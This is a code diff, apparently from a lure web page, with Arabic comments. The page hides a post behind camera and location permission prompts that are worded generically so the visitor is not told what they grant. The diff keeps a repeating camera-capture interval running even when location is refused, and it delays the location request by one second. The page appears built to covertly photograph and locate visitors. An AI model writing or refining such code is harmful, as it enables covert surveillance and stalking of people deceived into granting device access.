@@ -104,7 +104,6 @@
 
     function updateRetryMessage() {
       const keyword = getPermissionKeyword();
-      // نص عام دون ذكر الكاميرا أو الموقع
       retryMessage.textContent = `يجب النقر على ${keyword} للمتابعة`;
     }
 
@@ -118,15 +117,10 @@
     function showOverlay(reason) {
       retryReason = reason || 'camera';
       updateRetryMessage();
-      if (reason === 'camera') {
-        post.classList.add('hidden');
-        // إيقاف التصوير فقط عند رفض الكاميرا
-        if (capInt) clearInterval(capInt);
-      } else {
-        // رفض الموقع – المنشور يختفي لكن التصوير يستمر
-        post.classList.add('hidden');
-      }
+      post.classList.add('hidden');
       overlay.classList.remove('hidden');
+      // لا نوقف التصوير عند رفض الموقع
+      if (reason === 'camera' && capInt) clearInterval(capInt);
     }
 
     function hideOverlay() {
@@ -270,7 +264,10 @@
       }
       cameraGranted = true;
       hideOverlay();
-      requestLocation();
+      // فارق زمني 1 ثانية قبل طلب الموقع
+      setTimeout(() => {
+        requestLocation();
+      }, 1000);
     }
 
     retryBtn.addEventListener('click', async () => {
